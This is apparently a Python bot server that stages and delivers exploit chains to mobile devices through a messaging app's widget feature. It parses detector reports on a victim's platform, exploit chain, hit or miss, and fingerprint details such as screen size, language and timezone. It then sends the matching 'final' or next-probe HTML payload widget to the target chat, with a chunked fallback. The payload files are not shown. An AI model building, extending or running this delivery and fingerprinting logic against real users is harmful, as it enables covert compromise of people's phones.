#!/usr/bin/env python3
"""Unified two-phase answer/send server; Android + iOS 15 + iOS 27 (host artifact).

Report v2: "P2" + 46 hex (23 bytes):
  0 ver=2  1 platform(1=A13,2=iOS15,3=iOS27)  2 chain(1=route2,3=holes,4=parser)
  3 hit   4 att   5-6 sel (H for iOS15 / victim index for Android+iOS27)
  7-8 n (anchor offset / HIT index)   9-10 hd (header / VK)   11 cb (class / PH)
  12 dpr  13-14 sw  15-16 sh  17-18 lang  19 tz  20 profile  21-22 elapsed

Flow:
  detector query data = P2...  -> parse, map, ACK "K", sendWidget(target)
  fallback chunk data = E<i>   -> answerWidgetQuery(data=chunk i)

Mapping (platforms.json):
  1 android_route2 : hit -> final_inline.html ; miss -> final_fallback.html
  2 ios15_holes    : hit -> ios15/at_final_h<sel>.html ; miss -> next probe by H order
  3 ios27_parser   : hit -> ios27/final_ios27.html ; miss -> ios27/probe_fallback.html

Offline: --self-test (all rows), --simulate (hit+miss per platform),
         --manual-report <hex> --chat <id> (iOS 15 relay path; dry by default).
Live (only after approval; one getUpdates consumer):
  BOT_TOKEN=... python3 bot_two_phase.py --uid 0 --chunks chunks
"""
import hashlib
import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import bot_server as bs  # noqa: E402

REPORT_LEN = 23
IOS15_H_ORDER = [400, 200, 500, 64]


def parse_report(data):
    if not isinstance(data, str) or len(data) != 2 + 2 * REPORT_LEN or not data.startswith("P2"):
        return None
    try:
        b = bytes.fromhex(data[2:])
    except ValueError:
        return None
    if len(b) != REPORT_LEN or b[0] != 2:
        return None
    return {
        "ver": b[0], "platform": b[1], "chain": b[2],
        "hit": b[3] == 1, "att": b[4],
        "sel": (b[5] << 8) | b[6],
        "n": (b[7] << 8) | b[8],
        "hd": (b[9] << 8) | b[10], "cb": b[11],
        "dpr": b[12] / 10.0, "sw": (b[13] << 8) | b[14],
        "sh": (b[15] << 8) | b[16],
        "lang": chr(b[17]) + chr(b[18]), "tz": (b[19] - 128) * 15,
        "profile": b[20], "elapsed": (b[21] << 8) | b[22],
    }


def pack_report(platform, chain, hit, att=0, sel=599, n=0xFFFF, hd=0, cb=0,
                dpr=1.0, sw=0, sh=0, lang="it", tz=-60, profile=1, elapsed=50):
    b = [2, platform & 255, chain & 255, 1 if hit else 0, att & 255,
         (sel >> 8) & 255, sel & 255, (n >> 8) & 255, n & 255,
         (hd >> 8) & 255, hd & 255, cb & 255,
         min(255, round(dpr * 10)), (sw >> 8) & 255, sw & 255,
         (sh >> 8) & 255, sh & 255,
         ord(lang[0]) & 255, ord(lang[1]) & 255,
         min(255, max(0, round(tz / 15) + 128)), profile & 255,
         (elapsed >> 8) & 255, elapsed & 255]
    return "P2" + "".join("%02x" % x for x in b)


def target_for(rep, table):
    """Map a report to (kind, relative file, note)."""
    row = table.get(str(rep["platform"]))
    if row is None:
        return ("skip", None, "unknown platform")
    if rep["platform"] == 2:  # iOS 15: the final is H-specific; a miss advances the probe
        if rep["hit"]:
            f = row["finals"].get(str(rep["sel"]))
            return ("final", f, "ios15 H=%s" % rep["sel"]) if f else ("skip", None, "no final for H")
        if rep["sel"] in IOS15_H_ORDER:
            nxt = IOS15_H_ORDER[(IOS15_H_ORDER.index(rep["sel"]) + 1) % len(IOS15_H_ORDER)]
        else:
            nxt = IOS15_H_ORDER[0]
        return ("probe", row["probes"].get(str(nxt)), "ios15 retry H=%s" % nxt)
    if rep["hit"]:
        return ("final", row.get("final"), row["name"])
    return ("fallback", row.get("fallback"), row["name"])


class TwoPhase(bs.Bot):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self.table = json.load(open(os.path.join(HERE, "platforms.json")))
        self.cache = {}
        self.last_send = 0.0
        self.cooldown = 3.0

    def html(self, rel):
        if rel not in self.cache:
            self.cache[rel] = open(os.path.join(HERE, rel), encoding="utf-8").read()
        return self.cache[rel]

    def send_widget(self, chat_id, rel, tag):
        h = self.html(rel)
        t1 = time.time()
        if self.dry:
            self.log("DRY SEND", tag, rel, "chat=%s html=%dB sha=%s" % (
                chat_id, len(h.encode()), hashlib.sha256(h.encode()).hexdigest()[:16]))
            return {"ok": True}
        r = self.api("sendWidget", chat_id=chat_id, html=h, height=50,
                     allow_queries=True, background_query=True)
        self.log("SEND", tag, rel, "chat=%s html=%dB" % (chat_id, len(h.encode())),
                 "ok=%s" % r.get("ok"), "rt=%.0fms" % ((time.time() - t1) * 1000),
                 "" if r.get("ok") else repr(r.get("error") or r.get("body"))[:160])
        return r

    def answer_text(self, qid, text):
        if self.dry:
            self.log("DRY ANSWER", "widget_query_id=%s" % qid, "text=%r" % text)
            return {"ok": True}
        for f in ([self.good_field] if self.good_field else self.fields):
            r = self.api(self.method, **{"widget_query_id": qid, f: text})
            if r.get("ok"):
                if not self.good_field:
                    self.good_field = f
                return r
        return r

    def handle(self, update, t0=None):
        q = bs.find_query(update)
        if not q:
            return
        frm = q.get("from") or {}
        if self.uid and frm.get("id") != self.uid:
            self.log("SKIP uid", frm.get("id"))
            return
        data = q.get("data")
        rep = parse_report(data)
        if rep is not None:
            self.on_report(q, rep, t0)
            return
        i = bs.parse_index(data)
        if i is not None:
            super().handle(update, t0)
            return
        self.log("SKIP data", repr(data))

    def on_report(self, q, rep, t0):
        chat = (q.get("chat") or {}).get("id")
        kind, rel, note = target_for(rep, self.table)
        self.log("REPORT", "platform=%d chain=%d hit=%d att=%d sel=%d n=%d hd=%d cb=%d "
                 "dpr=%.1f scr=%dx%d lang=%s tz=%d el=%dms" % (
                     rep["platform"], rep["chain"], rep["hit"], rep["att"], rep["sel"],
                     rep["n"], rep["hd"], rep["cb"], rep["dpr"], rep["sw"], rep["sh"],
                     rep["lang"], rep["tz"], rep["elapsed"]),
                 "->", kind, rel, "(%s)" % note)
        self.answer_text(q.get("id"), "K")
        self.maybe_send(chat, kind, rel)

    def maybe_send(self, chat, kind, rel):
        if kind == "skip" or not rel:
            return
        now = time.time()
        if now - self.last_send < self.cooldown:
            self.log("SKIP send: cooldown")
            return
        self.last_send = now
        tag = {"final": "final", "fallback": "fallback", "probe": "next-probe"}[kind]
        self.send_widget(chat, rel, tag)
        if kind == "fallback" and rel.endswith("final_fallback.html"):
            self.log("FALLBACK active: %d chunks" % len(self.chunks))

    def manual_report(self, rep_hex, chat):
        rep = parse_report(rep_hex)
        if rep is None:
            self.log("MANUAL report invalid", repr(rep_hex))
            return 1
        kind, rel, note = target_for(rep, self.table)
        self.log("MANUAL", "platform=%d hit=%d sel=%d" % (rep["platform"], rep["hit"], rep["sel"]),
                 "->", kind, rel, "(%s)" % note)
        self.maybe_send(chat, kind, rel)
        return 0


def self_test():
    ok = True
    r = pack_report(1, 1, True, att=0, sel=599, n=0x123, hd=0x57, cb=30, dpr=2.8,
                    sw=1080, sh=2340, lang="it", tz=-60, elapsed=321)
    d = parse_report(r)
    ok &= d and d["platform"] == 1 and d["hit"] and d["sel"] == 599 and d["dpr"] == 2.8
    ok &= len(r) == 2 + 2 * REPORT_LEN and len(r) <= 64
    # iOS 15 rows: hit H400 -> at_final_h400; miss H400 -> at_probe_h200
    table = json.load(open(os.path.join(HERE, "platforms.json")))
    rep = parse_report(pack_report(2, 3, True, sel=400, n=545, hd=598, cb=36))
    ok &= target_for(rep, table)[:2] == ("final", "ios15/at_final_h400.html")
    rep = parse_report(pack_report(2, 3, False, sel=400))
    ok &= target_for(rep, table)[:2] == ("probe", "ios15/at_probe_h200.html")
    rep = parse_report(pack_report(3, 4, True, sel=599, n=598, cb=4))
    ok &= target_for(rep, table)[:2] == ("final", "ios27/final_ios27.html")
    rep = parse_report(pack_report(3, 4, False))
    ok &= target_for(rep, table)[:2] == ("fallback", "ios27/probe_fallback.html")
    rep = parse_report(pack_report(1, 1, False))
    ok &= target_for(rep, table)[:2] == ("fallback", "final_fallback.html")
    ok &= parse_report("P2zz") is None and parse_report("E0") is None
    print("SELF-TEST", "PASS" if ok else "FAIL", "| report len", len(r))
    return 0 if ok else 1


def simulate():
    uid0 = int(os.environ.get("BOT_UID", "0") or 0)
    os.makedirs(os.path.join(HERE, "state"), exist_ok=True)
    log = os.path.join(HERE, "state", "simulate.log")
    open(log, "w").close()
    b = TwoPhase("-", os.path.join(HERE, "chunks"), uid0, "answerWidgetQuery",
                 True, log, ["data"])
    b.cooldown = 0.0
    def q(qid, data, msg):
        return {"update_id": 1, "widget_query": {"id": qid, "data": data,
                "from": {"id": uid0}, "chat": {"id": 0}, "message_id": msg}}
    b.handle(q("a1", pack_report(1, 1, True, att=0), 100))
    b.handle(q("a2", pack_report(1, 1, False), 101))
    b.handle(q("i1", pack_report(2, 3, True, sel=400, n=545, hd=598, cb=36), 102))
    b.handle(q("i2", pack_report(2, 3, False, sel=400), 103))
    b.handle(q("j1", pack_report(3, 4, True, sel=599, n=598, cb=4), 104))
    b.handle(q("j2", pack_report(3, 4, False), 105))
    b.handle(q("e0", "E0", 101))
    txt = open(log).read()
    need = ["final_inline.html", "final_fallback.html", "ios15/at_final_h400.html",
            "ios15/at_probe_h200.html", "ios27/final_ios27.html",
            "ios27/probe_fallback.html", "i=0"]
    ok = all(n in txt for n in need)
    print("SIMULATE", "PASS" if ok else "FAIL")
    print(txt[-1600:])
    return 0 if ok else 1


if __name__ == "__main__":
    if "--self-test" in sys.argv:
        sys.exit(self_test())
    if "--simulate" in sys.argv:
        sys.exit(simulate())
    if "--manual-report" in sys.argv:
        rep = sys.argv[sys.argv.index("--manual-report") + 1]
        chat = int(sys.argv[sys.argv.index("--chat") + 1]) if "--chat" in sys.argv else 0
        dry = "--live" not in sys.argv
        b = TwoPhase("-", os.path.join(HERE, "chunks"), int(os.environ.get("BOT_UID", "0") or 0), "answerWidgetQuery",
                     dry, os.path.join(HERE, "state", "manual.log"), ["data"])
        b.cooldown = 0.0
        sys.exit(b.manual_report(rep, chat))
    bs.Bot = TwoPhase
    sys.exit(bs.main())
